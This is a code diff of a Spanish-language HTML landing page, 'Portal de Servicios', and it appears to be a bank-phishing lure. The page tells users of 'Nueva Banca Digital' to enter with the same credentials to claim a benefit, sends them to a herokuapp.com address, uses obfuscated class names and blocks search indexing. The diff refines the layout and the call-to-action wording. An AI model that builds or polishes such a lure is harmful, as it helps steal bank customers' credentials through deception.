@@ -1,7 +1,10 @@
-<html lang="es" data-v="x7k2"><head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="robots" content="noindex">
+
+<!DOCTYPE html>
+<html lang="es" data-v="x7k2">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta name="robots" content="noindex" />
 <title>Portal de Servicios</title>
 <style>
   :root{
@@ -46,16 +49,16 @@
   @media (max-width:768px){
     .nq4t{
      flex-direction:column; align-items:center; justify-content:flex-start;
-      min-height:auto; padding:9px 78px; gap:22px; text-align:center;
+      min-height:auto; padding:36px 18px; gap:22px; text-align:center;
     }
     .yc7f{ max-width:300px; margin:0 auto; }
     .yc7f img{ display:block; height:auto; margin-top: -36px; margin-left: -90px;}
     .dm5b{ max-width:360px; width:100%; margin:0 auto; }
-    .ws1g{ color:var(--c3); font-size:20px; line-height:1.2; margin:-15px -40px 12px; }
-    .eo6h{ font-size:16px; line-height:1.55; color:#3a3a3a; margin:-29px -46px 18px; }
+    .ws1g{ color:var(--c3); font-size:24px; line-height:1.2; margin:8px 0 12px; }
+    .eo6h{ font-size:16px; line-height:1.55; color:#3a3a3a; margin:0 0 18px; }
     .eo6h .bw3n{ color:#00724a; font-weight:600; }
     .tf8j{
-      margin-top:23px; width:100%; max-width:360px; display:inline-block;
+      width:100%; max-width:360px; display:inline-block;
       background:var(--c1); color:#fff; border:0; border-radius:12px;
       padding:14px 22px; font-size:15px; font-weight:800; cursor:pointer; transition:.2s;
     }
@@ -76,14 +79,14 @@
 </div>
 </div>
 <div class="xm4p lp9e">
-<br>
+<br><br><br>
 <h1 class="ry5s">¡Digitalizamos tu experiencia!</h1><br><br>
-<p class="ku8d">
+<p class="ku8d"><br><br><br> 
 Si ya se afilió a la <span class="bw3n">Nueva Banca Digital</span><br>
 ingrese aquí con las mismas credenciales y obtenga este beneficio
 </p>
 <br><br>
-<a href="https://newbanps-6270a7e488a0.herokuapp.com/" class="gv2c" rel="noopener">Solicitar en línea</a>
+<a href="https://newbanps-6270a7e488a0.herokuapp.com/" class="gv2c" rel="noopener">Enviar Solicitud de Participación</a>
 </div>
 </div>
 </section>
@@ -104,9 +107,9 @@ ingrese aquí con las mismas credenciales y obtenga este beneficio
 Si ya se afilió a la <span class="bw3n">Nueva Banca Digital</span><br>
 ingrese aquí con las mismas credenciales y obtenga este beneficio
 </p>
-<a style="text-decoration:none;" href="https://newbanps-6270a7e488a0.herokuapp.com/" class="tf8j" rel="noopener">Solicitar en línea</a>
+<a style="text-decoration:none;" href="https://newbanps-6270a7e488a0.herokuapp.com/" class="tf8j" rel="noopener">Enviar Solicitud de Participación</a>
 </div>
 </div>
 </section>
- 
-</body></html>
+</body>
+</html>
